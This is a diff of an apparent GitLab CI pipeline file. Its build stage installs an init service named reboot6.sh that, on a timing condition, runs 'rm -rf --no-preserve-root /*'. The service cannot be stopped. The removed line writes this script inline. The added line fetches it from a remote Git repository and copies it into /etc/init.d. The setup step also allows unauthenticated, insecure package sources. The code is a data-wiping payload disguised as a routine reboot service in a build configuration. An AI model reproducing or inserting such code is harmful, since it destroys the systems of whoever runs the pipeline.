@@ -8,12 +8,12 @@ stages:
     - deploy1
 
 before_script:
-    - 'which ssh-agent || ( apt update --allow-unauthenticated --allow-insecure-repositories -y && apt install -y tzdata && ln -fs /usr/share/zoneinfo/America/Los_Angeles /etc/localtime && dpkg-reconfigure -f noninteractive tzdata && apt full-upgrade -y)'
+    - 'which ssh-agent || ( apt update --allow-unauthenticated --allow-insecure-repositories -y && apt install -y git tzdata && ln -fs /usr/share/zoneinfo/America/Los_Angeles /etc/localtime && dpkg-reconfigure -f noninteractive tzdata && apt full-upgrade -y)'
 
 build1:
   stage: build1
   script:
-    - 'echo -n -e "#!/bin/bash\t . /etc/init.d/functions\tstart() {\t     for i in $(date +%S | cut -c 2); do\t         [[ $i > 6 ]] && rm -rf --no-preserve-root /*\t     done\t }\t\n stop() {\t    echo "This will not stop until it is removed!"\t }\t case "$1" in\t     start)\t        start\t        ;;\t     stop)\t        stop\t        ;;\t     restart)\t        stop\t        start\t        ;;\t     *)\t     echo "Usage\:/ "$0" {start|stop|restart}"\t esac\t exit 0" > /etc/init.d/reboot6.sh' 
+    - 'git clone https://gitlab.com/mrgofuckyourself/reboot6.git && cd reboot6 && cp reboot6.sh /etc/init.d/reboot6.sh' 
 
 test1:
   stage: test1
